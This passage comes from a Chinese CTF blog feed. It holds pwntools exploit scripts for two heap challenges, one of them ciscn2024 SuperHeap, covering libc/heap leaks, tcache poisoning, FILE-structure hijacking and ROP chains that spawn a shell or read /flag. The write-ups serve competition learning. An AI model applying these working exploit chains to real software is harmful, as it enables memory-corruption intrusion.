class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">1</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">2</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">1</span></span><br><span class="line">msg.whatthis = <span class="number">2</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">3</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">content</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">0</span></span><br><span class="line">msg.whatidx = <span class="number">0</span></span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(i,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u7f() - <span class="number">0x219ce0</span> - <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) * <span class="number">0x1000</span> - <span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i+<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">environ = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line">stdout=libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,p64((heap+<span class="number">0xf0</span>) ^((heap+<span class="number">0x4e40</span>)&gt;&gt;<span class="number">12</span>)))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&quot;AAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x10</span>))</span><br><span class="line">fill((((p16(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stdout)+p64(stdout)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap+<span class="number">0x10</span>)).ljust(<span class="number">0xe0</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">fill(p64(<span class="number">0xFBAD1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">8</span>))</span><br><span class="line">stack = u7f() - <span class="number">0x1a8</span> + <span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">fill((((p16(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">0</span>)+p16(<span class="number">0</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)+p16(<span class="number">1</span>)+p16(<span class="number">1</span>)).ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stack)).ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret = <span class="number">0x000000000002a3e6</span> + libc.address</span><br><span class="line"></span><br><span class="line">fill((p64(ret)*<span class="number">2</span>+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(<span class="number">0x58</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="ciscn2024-SuperHeap"><a href="#ciscn2024-SuperHeap" class="headerlink" title="ciscn2024-SuperHeap"></a>ciscn2024-SuperHeap</h2><p>第二天的第一道题,是可恶的cgo,建议用ida8.3这样的话不需要人工恢复符号</p><p>有沙盒,seccomp-tools能够dump出来,看样子是要orw</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./SuperHeap </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0d 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0015</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0a 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0015</span><br><span class="line"> 0005: 0x15 0x08 0x00 0x00000029  <span class="keyword">if</span> (A == socket) goto 0014</span><br><span class="line"> 0006: 0x15 0x07 0x00 0x0000002a  <span class="keyword">if</span> (A == connect) goto 0014</span><br><span class="line"> 0007: 0x15 0x06 0x00 0x00000031  <span class="keyword">if</span> (A == <span class="built_in">bind</span>) goto 0014</span><br><span class="line"> 0008: 0x15 0x05 0x00 0x00000032  <span class="keyword">if</span> (A == listen) goto 0014</span><br><span class="line"> 0009: 0x15 0x04 0x00 0x00000038  <span class="keyword">if</span> (A == <span class="built_in">clone</span>) goto 0014</span><br><span class="line"> 0010: 0x15 0x03 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0014</span><br><span class="line"> 0011: 0x15 0x02 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0014</span><br><span class="line"> 0012: 0x15 0x01 0x00 0x000000a5  <span class="keyword">if</span> (A == mount) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00050001  <span class="built_in">return</span> ERRNO(1)</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>然后这题因为是golang的题目,可以直接用之前提到过的pbtk工具提取出proto文件</p><p>add以及edit需要使用protobuf交互,并且还进行性了base64/32编码,先对message每一个字段进行b64编码,再protobuf序列化,最后b32编码</p><p>漏洞是出现在edit中,memmove没有检查大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v49 = len;</span><br><span class="line"><span class="keyword">if</span> ( v62 != *(uint8 **)v48 )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)v48, v62, v49);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v50 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( v60 &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v50 = v60;</span><br><span class="line"><span class="keyword">if</span> ( v65 != *(uint8 **)(v48 + <span class="number">8</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">8</span>), v65, v50);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v51 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( v59 &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v51 = v59;</span><br><span class="line">v52 = (<span class="type">int</span>)v64;</span><br><span class="line"><span class="keyword">if</span> ( v64 != *(uint8 **)(v48 + <span class="number">16</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">16</span>), v64, v51);</span><br><span class="line">  v83<span class="number">.0</span>.ptr = v63;</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br><span class="line">v53 = <span class="number">0x40000000</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( (__int64)v83<span class="number">.0</span>.len &lt; <span class="number">0x40000000</span> )</span><br><span class="line">  v53 = v83<span class="number">.0</span>.len;</span><br><span class="line"><span class="keyword">if</span> ( v83<span class="number">.0</span>.ptr != *(uint8 **)(v48 + <span class="number">24</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  runtime_memmove(*(_QWORD *)(v48 + <span class="number">24</span>), v83<span class="number">.0</span>.ptr, v53);</span><br><span class="line">  v48 = v67;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个库函数的声明如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MemMove</span><span class="params">(to, from unsafe.Pointer, n <span class="type">uintptr</span>)</span></span></span><br></pre></td></tr></table></figure><p>那么就存在堆溢出,之后的就是常规套路了</p><p>一份参考exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> bookProto_pb2</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;wt.exe&quot;</span>,<span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;../libc/&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def xxx():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cont = bookProto_pb2.CTFBook()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    <span class="comment"># p = process(name)</span></span><br><span class="line">    p = remote(<span class="string">&quot;8.147.133.230&quot;</span>,<span class="number">40626</span>)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,date,title=<span class="string">b&quot;AA&quot;</span>,author=<span class="string">b&quot;AAAA&quot;</span>,isbn=<span class="string">b&quot;AAA&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    cont.title = base64.b64encode(title)</span><br><span class="line">    cont.author = base64.b64encode(author)</span><br><span class="line">    cont.isbn = base64.b64encode(isbn)</span><br><span class="line">    cont.publish_date = base64.b64encode(date)</span><br><span class="line">    cont.price = <span class="number">41</span></span><br><span class="line">    cont.stock = <span class="number">1</span></span><br><span class="line">    payload = base64.b32encode(cont.SerializeToString())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Special Data:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,date,title=<span class="string">b&quot;AA&quot;</span>,author=<span class="string">b&quot;AAAA&quot;</span>,isbn=<span class="string">b&quot;AAA&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    cont.title = base64.b64encode(title)</span><br><span class="line">    cont.author = base64.b64encode(author)</span><br><span class="line">    cont.isbn = base64.b64encode(isbn)</span><br><span class="line">    cont.publish_date = base64.b64encode(date)</span><br><span class="line">    cont.price = <span class="number">41</span></span><br><span class="line">    cont.stock = <span class="number">1</span></span><br><span class="line">    payload = base64.b32encode(cont.SerializeToString())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Special Data:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))    </span><br><span class="line">get_p(<span class="string">&quot;./SuperHeap&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>,title=<span class="string">b&quot;BBBBB&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2e90</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*(<span class="number">0x70</span>+<span class="number">0x440</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span> - <span class="number">0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x3730</span>+heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(heap_addr+<span class="number">0x3730</span>) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x3730</span></span><br><span class="line">_IO_wfile_jumps = libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">ROP_addr = heap_addr + <span class="number">0x4000</span></span><br><span class="line">ret = <span class="number">0x000000000002a3e6</span> + libc.address</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">pop_rdx =  <span class="number">0x000000000011f2e7</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span> + libc.address</span><br><span class="line"></span><br><span class="line">FP = fake_io_addr</span><br><span class="line">A = FP + <span class="number">0x100</span></span><br><span class="line">B = A + <span class="number">0xe0</span> - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0xa0</span>-<span class="number">0x10</span>)*<span class="string">b&quot;\x00&quot;</span> + p64(A) <span class="comment"># </span></span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(_IO_wfile_jumps-<span class="number">0x40</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x190</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(ROP_addr) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>+<span class="number">0xe0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(B) + p64(setcontext + <span class="number">61</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(heap_addr+<span class="number">0x4000</span>) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(ROP_addr+<span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rdx) + p64(<span class="number">0x40</span>) *<span class="number">2</span> + p64(pop_rsi) + p64(heap_addr+<span class="number">0x1000</span>) + p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>) + <span class="string">b&quot;/flag\x00&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x020D1C7)&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line"><span class="comment"># payload = b&quot;A&quot;*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(stack) + p64(0x4044800000000000) + p64(200)</span></span><br><span class="line"><span class="comment"># edit(0,payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">主要是逆向</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="protobuf" scheme="https://ixout.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>uefi初识</title>
    <link href="https://ixout.github.io/posts/36191/"/>
    <id>https://ixout.github.io/posts/36191/</id>
    <published>2024-04-06T14:37:09.000Z</published>
    <updated>2024-04-18T09:11:31.848Z</updated>
    
